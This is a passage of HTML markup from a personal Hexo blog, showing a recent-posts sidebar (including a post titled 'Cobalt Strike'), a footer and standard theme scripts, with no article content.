fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2986.html" title="Recent arrangements"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Recent arrangements"/></a><div class="content"><a class="title" href="/2986.html" title="Recent arrangements">Recent arrangements</a><time datetime="2099-11-01T04:00:00.000Z" title="Created 2099-11-01 12:00:00">2099-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/9b1d.html" title="No title"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="No title"/></a><div class="content"><a class="title" href="/9b1d.html" title="No title">No title</a><time datetime="2099-10-31T16:00:00.000Z" title="Created 2099-11-01 00:00:00">2099-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/62d1.html" title="Chrome 浏览器扩展开发初试"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Chrome 浏览器扩展开发初试"/></a><div class="content"><a class="title" href="/62d1.html" title="Chrome 浏览器扩展开发初试">Chrome 浏览器扩展开发初试</a><time datetime="2020-11-07T05:04:25.000Z" title="Created 2020-11-07 13:04:25">2020-11-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/558a.html" title="Cobalt Strike"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Cobalt Strike"/></a><div class="content"><a class="title" href="/558a.html" title="Cobalt Strike">Cobalt Strike</a><time datetime="2020-11-04T13:33:44.000Z" title="Created 2020-11-04 21:33:44">2020-11-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/abc8.html" title="2020小组招新有感"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2020小组招新有感"/></a><div class="content"><a class="title" href="/abc8.html" title="2020小组招新有感">2020小组招新有感</a><time datetime="2020-10-23T16:56:04.000Z" title="Created 2020-10-24 00:56:04">2020-10-24</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 By m0nk3y</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>